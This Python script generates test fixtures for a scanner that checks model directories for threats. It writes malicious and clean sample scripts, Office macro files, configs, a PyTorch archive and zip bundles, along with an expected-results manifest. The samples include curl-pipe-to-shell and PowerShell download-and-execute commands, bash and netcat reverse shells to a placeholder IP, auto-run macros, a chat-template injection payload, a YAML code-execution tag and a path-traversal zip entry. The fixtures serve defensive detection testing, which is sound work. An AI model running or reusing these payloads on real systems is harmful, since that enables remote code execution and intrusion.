#!/usr/bin/env python3
"""模型目录里的脚本、配置、Office 宏样本（恶意与正常各一）及 manifest.json。

用法：python3 gen_scripts.py <输出目录>
manifest 每项：file、lang（分组语言）、rules（必须命中的规则）、clean（true 表示不得出现中危及以上）。
恶意样本只写文件，不执行。vbaProject.bin 不是完整 OLE：OLE 文件头 + 按 MS-OVBA 压缩的模块源码
（只用字面量记号，符合规范），足够验证“字符串提取 + 解压”的检测路径。
"""
import io, json, os, sys, zipfile

OUT = sys.argv[1]
os.makedirs(OUT, exist_ok=True)
MANIFEST = []
HERE = os.path.dirname(os.path.abspath(__file__))


def put(rel, data, **expect):
    path = os.path.join(OUT, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(data if isinstance(data, bytes) else data.encode("utf-8"))
    if expect:
        MANIFEST.append({"file": rel, **expect})


def evil(rel, text, lang, rules):
    put(rel, text, lang=lang, rules=rules, clean=False)


def ok(rel, text, lang):
    put(rel, text, lang=lang, rules=[], clean=True)


# —— 各语言脚本
evil("scripts/evil.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", "python", ["code.obfuscated_execution"])
ok("scripts/ok.py", "import torch\n\nmodel = torch.nn.Linear(2, 2)\nmodel.eval()\nprint(model)\n", "python")
evil("scripts/evil.js", "const cp = require('child_process');\ncp.exec('curl ' + host + ' | sh');\n", "javascript",
     ["code.command_execution", "code.command_injection"])
ok("scripts/ok.js", "const x = [1, 2].map((v) => v * 2);\nconsole.log(x);\n", "javascript")
evil("scripts/evil.ts", "import { execSync } from 'child_process';\nexport function run(dir: string) {\n  execSync(`rm -rf ${dir}`);\n}\n",
     "typescript", ["code.command_execution"])
ok("scripts/ok.ts", "export function add(a: number, b: number): number {\n  return a + b;\n}\n", "typescript")
evil("scripts/evil.sh", "#!/bin/sh\ncurl -fsSL http://203.0.113.7/x.sh | bash\n", "shell", ["code.remote_code_execution"])
ok("scripts/ok.sh", "#!/bin/sh\n# 训练入口\npython train.py --epochs 3\n", "shell")
evil("scripts/evil.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\n", "powershell",
     ["win.download_exec"])
ok("scripts/ok.ps1", "Get-ChildItem -Path . | Select-Object Name\n", "powershell")
evil("scripts/evil.bat", "@echo off\ncertutil -urlcache -split -f http://203.0.113.7/a.exe a.exe && a.exe\n", "batch",
     ["win.lolbin"])
ok("scripts/ok.bat", "@echo off\npython train.py\n", "batch")
evil("scripts/evil.cmd", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n", "batch",
     ["win.encoded_command", "win.hidden_powershell"])
ok("scripts/ok.cmd", "echo done\n", "batch")
evil("scripts/evil.vbs", 'Set sh = CreateObject("WScript.Shell")\nsh.Run "cmd /c calc.exe", 0\n', "vbscript",
     ["vba.shell_exec", "vba.create_object", "vba.shell_command"])
ok("scripts/ok.vbs", 'MsgBox "hello"\n', "vbscript")
evil("scripts/evil.bas", 'Sub AutoOpen()\n    Shell "powershell -c calc", vbHide\nEnd Sub\n', "vba",
     ["vba.auto_exec", "vba.shell_exec", "vba.shell_command", "vba.auto_exec_payload"])
ok("scripts/ok.bas", "Sub Hello()\n    MsgBox \"hi\"\nEnd Sub\n", "vba")
evil("scripts/evil.vba", 'Sub Document_Open()\n  x = Chr(99) & Chr(109) & Chr(100) & Chr(32) & Chr(47) & Chr(99)\n  URLDownloadToFile 0, "http://203.0.113.7/a.exe", Environ("TEMP") & "\\a.exe", 0, 0\nEnd Sub\n',
     "vba", ["vba.auto_exec", "vba.obfuscation", "vba.download", "vba.environ", "vba.auto_exec_payload"])
evil("scripts/revshell.sh", "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n", "shell", ["script.reverse_shell"])


# —— Office 宏文档
def ovba_compress(data: bytes) -> bytes:
    """MS-OVBA 压缩容器，只用字面量记号（每 8 字节前一个 0x00 标志字节）。"""
    out = bytearray([0x01])
    for i in range(0, len(data), 4096):
        chunk = data[i:i + 4096]
        body = bytearray()
        for j in range(0, len(chunk), 8):
            body.append(0x00)
            body += chunk[j:j + 8]
        assert len(body) + 2 <= 4098
        out += (0xB000 | (len(body) + 2 - 3)).to_bytes(2, "little") + body
    return bytes(out)


def vba_project(source: str) -> bytes:
    header = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504
    module = ("Attribute VB_Name = \"Module1\"\r\n" + source.replace("\n", "\r\n")).encode("latin1")
    return header + b"\x00" * 64 + ovba_compress(module) + b"\x00" * 128


def office(main_part, source):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr(main_part, "<x/>")
        z.writestr(os.path.dirname(main_part) + "/vbaProject.bin", vba_project(source))
    return buf.getvalue()


put("office/evil.xlsm", office("xl/workbook.xml", "Sub AutoOpen()\n    Shell \"cmd /c calc.exe\"\nEnd Sub\n"),
    lang="vba", rules=["vba.auto_exec", "vba.shell_exec", "vba.auto_exec_payload"], clean=False)
put("office/evil.docm", office("word/document.xml",
                               "Sub Document_Open()\n  URLDownloadToFile 0, \"http://203.0.113.7/a.exe\", \"a.exe\", 0, 0\nEnd Sub\n"),
    lang="vba", rules=["vba.auto_exec", "vba.download", "vba.auto_exec_payload"], clean=False)
put("office/ok.xlsm", office("xl/workbook.xml", "Sub Hello()\n    MsgBox \"hi\"\nEnd Sub\n"),
    lang="vba", rules=[], clean=True)
AUTO_SHELL = "Sub AutoOpen()\n    Shell \"cmd /c calc.exe\"\nEnd Sub\n"
for ext, part in (("pptm", "ppt/presentation.xml"), ("xlam", "xl/workbook.xml"), ("dotm", "word/document.xml")):
    put(f"office/evil.{ext}", office(part, AUTO_SHELL),
        lang="vba", rules=["vba.auto_exec", "vba.shell_exec", "vba.auto_exec_payload"], clean=False)
# 老式 .xls/.doc 是 OLE 复合文档，宏工程直接在文件里：对整个文件找压缩的模块源码
for ext in ("xls", "doc"):
    put(f"office/evil.{ext}", vba_project(AUTO_SHELL),
        lang="vba", rules=["vba.auto_exec", "vba.shell_exec", "vba.auto_exec_payload"], clean=False)
# 没有宏的老式文档：正文里提到 powershell、cmd /c 不算宏
put("office/ok.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504
    + b"How to run powershell -enc and cmd /c in Shell(...) scripts" + b"\x00" * 64,
    lang="vba", rules=[], clean=True)

# —— 配置文件
qwen_tpl = open(os.path.join(HERE, "templates", "qwen2.5-3b-instruct.jinja"), encoding="utf-8").read()
put("configs/ok/tokenizer_config.json", json.dumps({"model_max_length": 32768, "chat_template": qwen_tpl}),
    lang="config", rules=[], clean=True)
put("configs/ok/config.json", json.dumps({"architectures": ["Qwen2ForCausalLM"], "model_type": "qwen2"}),
    lang="config", rules=[], clean=True)
put("configs/ok/generation_config.json", json.dumps({"do_sample": True, "temperature": 0.7}),
    lang="config", rules=[], clean=True)
put("configs/ssti/tokenizer_config.json",
    json.dumps({"chat_template": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"}),
    lang="config", rules=["GGUF_TEMPLATE_SSTI"], clean=False)
put("configs/evil/generation_config.json",
    json.dumps({"do_sample": True, "_hook": "bash -c 'curl http://203.0.113.7:8080/payload.sh | sh'"}),
    lang="config", rules=["config.command_fragment", "config.suspicious_url"], clean=False)
# YAML 只看 mergekit 配置和与权重同目录的，所以这里放一个权重文件
put("configs/evil/model.safetensors", b"\x02\x00\x00\x00\x00\x00\x00\x00{}")
put("configs/evil/train.yaml", "model: demo\ntrust_remote_code: true\ncallback: !!python/object/apply:os.system [\"id\"]\n",
    lang="config", rules=["config.trust_remote_code", "config.yaml_python_tag"], clean=False)
put("configs/ok/train.yml", "model: demo\nlr: 0.0001\nurl: https://huggingface.co/Qwen/Qwen2.5-7B\n",
    lang="config", rules=[], clean=True)

# —— auto_map 指向自定义代码（目录扫描测试用，不进 manifest）
put("automap/config.json", json.dumps({"architectures": ["EvilModel"], "model_type": "evil",
                                       "auto_map": {"AutoModelForCausalLM": "modeling_evil.EvilModel",
                                                    "AutoConfig": "configuration_evil.EvilConfig"}}))
put("automap/modeling_evil.py", "import os\n\nclass EvilModel:\n    def __init__(self):\n        os.system('curl http://203.0.113.7/x | sh')\n")
put("automap/model.safetensors", b"\x02\x00\x00\x00\x00\x00\x00\x00{}")

# —— PyTorch 归档里夹带的脚本（torch.package 形式）
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
    z.writestr("archive/data.pkl", b"\x80\x02}q\x00.")
    z.writestr("archive/code/hook.py", "import os\nos.system('nc -e /bin/sh 203.0.113.7 4444')\n")
put("archive/model.pt", buf.getvalue(), lang="python", rules=["code.command_execution", "script.reverse_shell"], clean=False)

# —— 普通压缩包：宏文档、一层嵌套 zip（再嵌一层的不展开）、路径穿越的条目名（不在 manifest，单独测）
def zbytes(entries, method=zipfile.ZIP_DEFLATED):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", method) as z:
        for name, data in entries:
            z.writestr(name, data)
    return b.getvalue()


EVIL_SH = "#!/bin/sh\ncurl -fsSL http://203.0.113.7/x.sh | bash\n"
deeper = zbytes([("deep/evil.sh", EVIL_SH)])
inner = zbytes([("x/evil.sh", EVIL_SH), ("y/deeper.zip", deeper)])
put("archive/bundle.zip", zbytes([
    ("bundle/macro.xlsm", office("xl/workbook.xml", AUTO_SHELL)),
    ("../../etc/cron.d/evil.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"),
    ("nested/inner.zip", inner),
]))
# 条目数超过上限：505 个脚本
put("archive/many.zip", zbytes([(f"s/{i:03d}.sh", "echo ok\n") for i in range(505)]))

# —— 依赖和虚拟环境目录：目录扫描不进去
for rel in ("node_modules/pkg/index.js", ".venv/lib/python3.11/site-packages/pkg/evil.py",
            "venv/lib/evil.py", "site-packages/evil.py", "dist-packages/evil.py", ".git/hooks/pre-commit.sh",
            "__pycache__/evil.py"):
    put("deps/" + rel, "import os\nos.system('curl http://203.0.113.7/x | sh')\n")
put("deps/model/model.safetensors", b"\x02\x00\x00\x00\x00\x00\x00\x00{}")

# —— 数量上限时的取舍：与 config.json 同目录的 .py 排在其他脚本前面
put("prio/a_tools/a.py", "print(1)\n")
put("prio/a_tools/b.py", "print(2)\n")
put("prio/model/config.json", json.dumps({"architectures": ["X"], "auto_map": {"AutoModel": "modeling_x.X"}}))
put("prio/model/modeling_x.py", "class X:\n    pass\n")

with open(os.path.join(OUT, "manifest.json"), "w", encoding="utf-8") as fh:
    json.dump(MANIFEST, fh, ensure_ascii=False, indent=1)
print(f"generated {len(MANIFEST)} script samples into {OUT}")
